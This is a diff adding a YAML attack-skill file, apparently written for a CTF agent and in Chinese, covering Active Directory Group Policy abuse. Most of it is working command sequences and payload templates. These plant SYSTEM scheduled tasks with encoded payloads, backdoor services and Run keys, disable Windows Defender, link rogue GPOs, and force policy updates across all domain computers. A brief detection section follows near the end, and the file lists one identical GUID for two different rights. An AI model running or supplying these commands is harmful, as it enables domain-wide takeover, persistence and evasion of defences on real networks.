@@ -1,0 +1,378 @@
+name: gpo_attack
+description: GPO组策略攻击 - 组策略对象滥用技术，通过GPO下发恶意计划任务、修改配置实现权限提升和横向移动
+version: "2.0"
+author: CTF-Agent Team
+tags: [gpo, group-policy, active-directory, persistence, privilege-escalation, lateral-movement]
+priority: high
+
+# 使用场景
+scenarios:
+  - GPO滥用下发恶意任务
+  - 通过GPO实现域内权限提升
+  - GPO持久化技术
+  - GPO ACL滥用
+  - 强制GPO更新攻击
+
+# 核心技术
+techniques:
+  - GPO Scheduled Task Abuse: 通过GPO下发恶意计划任务
+  - GPO Service Abuse: 通过GPO配置恶意服务
+  - GPO Registry Modification: 通过GPO修改注册表
+  - GPO ACL Abuse: 滥用GPO对象ACL权限
+  - GPO Link Abuse: 滥用GPO链接权限
+  - Forced GPO Update: 强制GPO更新触发恶意配置
+
+# 工具列表
+tools:
+  - PowerGPOAbuse: PowerShell GPO滥用工具
+  - SharpGPOAbuse: C# GPO滥用工具
+  - PowerView: AD枚举
+  - GroupPolicy PowerShell Module: 原生GPO管理
+  - GPMC: 组策略管理控制台
+  - BloodHound: GPO权限路径分析
+  - PurpleSharp: GPO攻击模拟
+
+# GPO基础
+basics:
+  - concept: |
+      # GPO概述
+
+      # GPO是什么?
+      # - Group Policy Object，组策略对象
+      # - 用于集中管理AD域内计算机和用户配置
+      # - 可下发软件、注册表设置、计划任务等
+
+      # GPO结构:
+      # - GPO GUID: 唯一标识符
+      # - GPO DisplayName: 显示名称
+      # - GPO Link: 链接到OU/Site/Domain
+
+      # GPO内容:
+      # - Computer Configuration: 计算机配置
+      # - User Configuration: 用户配置
+
+      # 重要GPO路径:
+      # CN=Policies,CN=System,DC=domain,DC=local
+      # \\domain.local\SYSVOL\domain.local\Policies\{GPO_GUID}
+
+  - important_permissions: |
+      # GPO权限
+
+      # 关键权限:
+      # - Edit settings, delete, modify security: 完全控制
+      # - Edit settings: 修改GPO内容
+      # - Link GPOs: 链接GPO到OU
+
+      # 默认有GPO编辑权限的组:
+      # - Domain Admins
+      # - Enterprise Admins
+      # - Group Policy Creator Owners
+
+      # GPO ACL GUID:
+      # - Edit: 030a1dbb-8d36-11d8-9c0e-00c04fc9e5ed
+      # - Link: 030a1dbb-8d36-11d8-9c0e-00c04fc9e5ed
+
+# 信息收集
+reconnaissance:
+  - gpo_enum: |
+      # GPO枚举
+
+      # 使用PowerView
+      Get-DomainGPO -Properties DisplayName, Name, gPCFileSysPath
+
+      # 获取所有GPO
+      Get-DomainGPO | Select-Object displayName, name, distinguishedName
+
+      # 获取GPO链接
+      Get-DomainGPOLocation | Select-Object GPODisplayName, LocationName, LocationType
+
+      # 使用原生PowerShell
+      Get-GPO -All | Select-Object DisplayName, GpoStatus, Id
+
+      # 获取GPO ACL
+      Get-DomainGPO | Get-ObjectAcl -ResolveGUIDs
+
+      # BloodHound分析
+      # 查找"Owns GPO"、"WriteGPO"等权限
+
+  - gpo_acl_analysis: |
+      # GPO ACL分析
+
+      # 检查有编辑权限的用户
+      Get-DomainGPO | ForEach-Object {
+        Write-Host "GPO: $($_.displayName)"
+        (Get-ObjectAcl -ADPath $_.distinguishedName -ResolveGUIDs).Where({
+          $_.ObjectType -eq "030a1dbb-8d36-11d8-9c0e-00c04fc9e5ed" -or
+          $_.AccessRight -eq "WriteProperty"
+        }).IdentityReference
+      }
+
+      # 检查有链接权限的OU
+      Get-DomainOU | Get-ObjectAcl -ResolveGUIDs | Where-Object {
+        $_.ObjectType -eq "030a1dbb-8d36-11d8-9c0e-00c04fc9e5ed"
+      }
+
+      # 使用PowerGPOAbuse
+      Find-GPOAbuse
+
+  - affected_computers: |
+      # 查找GPO影响的计算机
+
+      # 获取特定GPO影响的计算机
+      Get-DomainComputer | Where-Object {
+        $_.distinguishedName -match "OU=TargetOU"
+      }
+
+      # 通过GPO链接查找
+      Get-DomainGPOLocation -Name "Target GPO" | Get-DomainComputer
+
+      # 查找GPO应用范围
+      Get-GPOReport -Name "Target GPO" -ReportType XML | Select-String "OU="
+
+# 计划任务攻击
+scheduled_task_attack:
+  - technique: |
+      # GPO计划任务攻击
+
+      # 前置条件:
+      # 1. 有GPO编辑权限
+      # 2. GPO已链接到目标OU
+
+      # 使用PowerGPOAbuse创建计划任务
+
+      Import-Module PowerGPOAbuse
+
+      # 创建立即执行的计划任务
+      Add-TaskGPO -GPOName "Target GPO" -TaskName "BackdoorTask" -TaskAuthor "NT AUTHORITY\SYSTEM" -Command "cmd.exe" -Arguments "/c whoami > C:\temp.txt"
+
+      # 创建定时计划任务
+      Add-TaskGPO -GPOName "Target GPO" -TaskName "PersistentTask" -TaskAuthor "NT AUTHORITY\SYSTEM" -Command "powershell.exe" -Arguments "-enc BASE64_ENCODED_PAYLOAD" -Trigger "DAILY" -StartTime "03:00"
+
+      # 使用SharpGPOAbuse
+      SharpGPOAbuse.exe --AddComputerTask --TaskName "Backdoor" --TaskAuthor "SYSTEM" --Command "cmd.exe" --Arguments "/c whoami" --GPOName "Target GPO"
+
+  - manual_creation: |
+      # 手动修改GPO XML
+
+      # 1. 找到GPO路径
+      Get-DomainGPO -Name "Target GPO" | Select-Object gPCFileSysPath
+
+      # 2. 访问SYSVOL路径
+      \\domain.local\SYSVOL\domain.local\Policies\{GPO_GUID}
+
+      # 3. 编辑计划任务XML
+      # Machine\Preferences\ScheduledTasks\ScheduledTasks.xml
+
+      # XML结构:
+      <ScheduledTasks version="1">
+        <TaskV2 action="CREATE" name="BackdoorTask">
+          <Properties>
+            <Author>NT AUTHORITY\SYSTEM</Author>
+            <Command>cmd.exe</Command>
+            <Arguments>/c whoami</Arguments>
+            <Triggers>
+              <TimeTrigger>
+                <StartBoundary>2024-01-01T03:00:00</StartBoundary>
+                <Enabled>true</Enabled>
+              </TimeTrigger>
+            </Triggers>
+          </Properties>
+        </TaskV2>
+      </ScheduledTasks>
+
+      # 4. 强制GPO更新
+      Invoke-GPOUpdate -ComputerName "TargetPC"
+
+# 服务攻击
+service_attack:
+  - technique: |
+      # GPO服务攻击
+
+      # 使用PowerGPOAbuse添加服务
+      Add-ServiceGPO -GPOName "Target GPO" -ServiceName "BackdoorService" -ImagePath "C:\Windows\Temp\backdoor.exe" -StartType "AUTO"
+
+      # 手动编辑Services.xml
+      # Machine\Preferences\Services\Services.xml
+
+      <Services>
+        <Service action="CREATE" name="BackdoorService">
+          <Properties>
+            <ImagePath>C:\Windows\Temp\backdoor.exe</ImagePath>
+            <StartType>AUTOMATIC</StartType>
+          </Properties>
+        </Service>
+      </Services>
+
+# 注册表攻击
+registry_attack:
+  - technique: |
+      # GPO注册表攻击
+
+      # 添加注册表项
+      Add-RegistryGPO -GPOName "Target GPO" -Key "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" -ValueName "Backdoor" -ValueType "REG_SZ" -ValueData "C:\Windows\Temp\backdoor.exe"
+
+      # 禁用安全软件
+      Add-RegistryGPO -GPOName "Target GPO" -Key "HKLM\Software\Policies\Microsoft\Windows Defender" -ValueName "DisableAntiSpyware" -ValueType "REG_DWORD" -ValueData "1"
+
+      # 手动编辑Registry.xml
+      # Machine\Preferences\Registry\Registry.xml
+
+# ACL滥用
+acl_abuse:
+  - technique: |
+      # GPO ACL滥用
+
+      # 场景1: 有GPO编辑权限但不是管理员
+
+      # 检查可编辑的GPO
+      Get-DomainGPO | ForEach-Object {
+        $acl = Get-ObjectAcl -ADPath $_.distinguishedName -ResolveGUIDs
+        if ($acl.Where({$_."IdentityReference" -match "CurrentUser"})) {
+          Write-Host "可编辑: $($_.displayName)"
+        }
+      }
+
+      # 使用编辑权限添加恶意任务
+      Add-TaskGPO -GPOName "EditableGPO" -TaskName "Backdoor" -Command "powershell.exe" -Arguments "-enc PAYLOAD"
+
+      # 场景2: 有OU的链接权限
+
+      # 创建新GPO
+      New-GPO -Name "BackdoorGPO"
+
+      # 链接到有权限的OU
+      New-GPLink -Name "BackdoorGPO" -Target "OU=TargetOU,DC=domain,DC=local"
+
+      # 编辑GPO内容
+      Add-TaskGPO -GPOName "BackdoorGPO" -TaskName "MaliciousTask" -Command "cmd.exe"
+
+# 强制GPO更新
+forced_update:
+  - technique: |
+      # 强制GPO更新
+
+      # 在目标计算机触发GPO更新
+
+      # 使用PsExec
+      psexec.exe \\TargetPC gpupdate /force
+
+      # 使用WinRM
+      Invoke-Command -ComputerName TargetPC -ScriptBlock { gpupdate /force }
+
+      # 使用IMPacket
+      python psexec.py domain/user:password@TargetPC "gpupdate /force"
+
+      # 批量更新
+      Get-DomainComputer | ForEach-Object {
+        Invoke-Command -ComputerName $_.Name -ScriptBlock { gpupdate /force } -ErrorAction SilentlyContinue
+      }
+
+# 持久化
+persistence:
+  - technique: |
+      # GPO持久化
+
+      # 方法1: 创建持久化计划任务
+      Add-TaskGPO -GPOName "Target GPO" -TaskName "DailyBackdoor" -Command "powershell.exe" -Arguments "-enc PAYLOAD" -Trigger "DAILY" -StartTime "03:00"
+
+      # 方法2: 创建启动项服务
+      Add-ServiceGPO -GPOName "Target GPO" -ServiceName "PersistentService" -ImagePath "C:\Windows\System32\backdoor.exe" -StartType "AUTO"
+
+      # 方法3: 添加注册表启动项
+      Add-RegistryGPO -GPOName "Target GPO" -Key "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" -ValueName "StartupBackdoor" -ValueData "C:\Windows\Temp\backdoor.exe"
+
+      # 方法4: GPO软件安装
+      # 配置软件安装分发恶意软件
+
+# 检测和防御
+defense:
+  - detection: |
+      # 检测GPO攻击
+
+      # 1. 监控GPO修改事件
+      # 事件ID: 4739 (域策略更改)
+      # 事件ID: 5136 (目录服务修改)
+
+      # 2. 监控SYSVOL文件修改
+
+      # 3. 审计计划任务XML修改
+
+      # 4. 定期审计GPO ACL
+
+      # PowerShell检测脚本
+      Get-WinEvent -FilterHashtable @{
+        LogName='Security'
+        ID=4739
+      } | Where-Object {
+        $_.Message -match "Group Policy"
+      }
+
+      # 检查异常计划任务
+      Get-GPO -All | ForEach-Object {
+        $xml = Get-GPOReport -Name $_.DisplayName -ReportType XML
+        if ($xml -match "ScheduledTask" -and $xml -match "cmd.exe|powershell.exe") {
+          Write-Host "可疑GPO: $($_.DisplayName)"
+        }
+      }
+
+  - mitigation: |
+      # 缓解措施
+
+      # 1. 严格限制GPO编辑权限
+
+      # 2. 审计GPO ACL变更
+
+      # 3. 监控SYSVOL文件修改
+
+      # 4. 使用GPO备份和版本控制
+
+      # 5. 定期审查GPO内容
+
+# 完整攻击流程
+attack_chain:
+  - step1: "GPO枚举和ACL分析"
+  - step2: "识别有编辑权限的GPO"
+  - step3: "创建恶意计划任务/服务/注册表项"
+  - step4: "确认GPO链接到目标OU"
+  - step5: "强制GPO更新或等待自动更新"
+  - step6: "恶意任务在目标主机执行"
+  - step7: "维持持久化"
+
+# Payload模板
+payloads:
+  - name: "GPO计划任务Payload"
+    template: |
+      # GPO计划任务攻击Payload
+
+      Import-Module PowerGPOAbuse
+
+      # 查找可编辑的GPO
+      Find-GPOAbuse
+
+      # 创建计划任务
+      Add-TaskGPO -GPOName "Default Domain Policy" -TaskName "Backdoor" -TaskAuthor "NT AUTHORITY\SYSTEM" -Command "powershell.exe" -Arguments "-WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -EncodedCommand BASE64_PAYLOAD" -Trigger "DAILY" -StartTime "03:00"
+
+      # 强制更新
+      Get-DomainComputer | ForEach-Object {
+        Invoke-Command -ComputerName $_.Name -ScriptBlock { gpupdate /force }
+      }
+
+  - name: "GPO注册表Payload"
+    template: |
+      # GPO注册表攻击Payload
+
+      Import-Module PowerGPOAbuse
+
+      # 禁用Windows Defender
+      Add-RegistryGPO -GPOName "Target GPO" -Key "HKLM\Software\Policies\Microsoft\Windows Defender" -ValueName "DisableAntiSpyware" -ValueType "REG_DWORD" -ValueData "1"
+
+      # 添加启动项
+      Add-RegistryGPO -GPOName "Target GPO" -Key "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" -ValueName "Backdoor" -ValueType "REG_SZ" -ValueData "C:\Windows\Temp\backdoor.exe"
+
+# 参考资源
+references:
+  - https://github.com/PowerShellMafia/PowerSploit
+  - https://github.com/rootSySdk/PowerGPOAbuse
+  - https://github.com/GhostPack/SharpGPOAbuse
+  - https://adsecurity.org/?p=2729
+  - https://www.harmj0y.net/blog/redteaming/abusing-gpo-permissions/
